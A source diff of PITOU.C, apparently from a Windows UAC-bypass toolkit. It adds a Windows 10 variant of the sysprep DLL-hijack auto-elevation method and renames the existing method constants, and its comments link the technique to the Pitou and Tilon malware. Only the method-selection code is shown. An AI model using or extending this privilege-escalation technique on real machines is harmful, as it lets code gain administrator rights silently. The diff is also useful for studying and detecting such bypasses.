@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     1.70
+*  VERSION:     1.72
 *
-*  DATE:        24 Apr 2015
+*  DATE:        28 Apr 2015
 *
 *  Leo Davidson work based AutoElevation and Pitou new variant.
 *
@@ -176,6 +176,7 @@ DWORD WINAPI ucmElevatedLoadProc(
 * M1W7   - Original Leo Davidson concept.
 * M1W8   - Windows 8.1 adapted M1W7 (bypassing sysprep embedded manifest dlls redirection).
 * M1W7T  - Leo Davidson concept with different target dll, used by Win32/Tilon.
+* M1W10  - Windows 10 adapter M1W7.
 * M1WALL - WinNT/Pitou derivative from Leo Davidson concept.
 *
 */
@@ -192,14 +193,20 @@ BOOL ucmStandardAutoElevation(
 
 	switch (dwType) {
 
-	case METHOD_SYSPREP:
+	case METHOD_SYSPREP1:
 		lpSourceDll = M1W7_SOURCEDLL;
 		lpTargetDir = M1W7_TARGETDIR;
 		lpTargetProcess = M1W7_TARGETPROCESS;
 		break;
 
-	case METHOD_SYSPREP_EX:
+	case METHOD_SYSPREP2:
 		lpSourceDll = M1W8_SOURCEDLL;
+		lpTargetDir = M1W7_TARGETDIR;
+		lpTargetProcess = M1W7_TARGETPROCESS;
+		break;
+
+	case METHOD_SYSPREP3:
+		lpSourceDll = M1W10_SOURCEDLL;
 		lpTargetDir = M1W7_TARGETDIR;
 		lpTargetProcess = M1W7_TARGETPROCESS;
 		break;
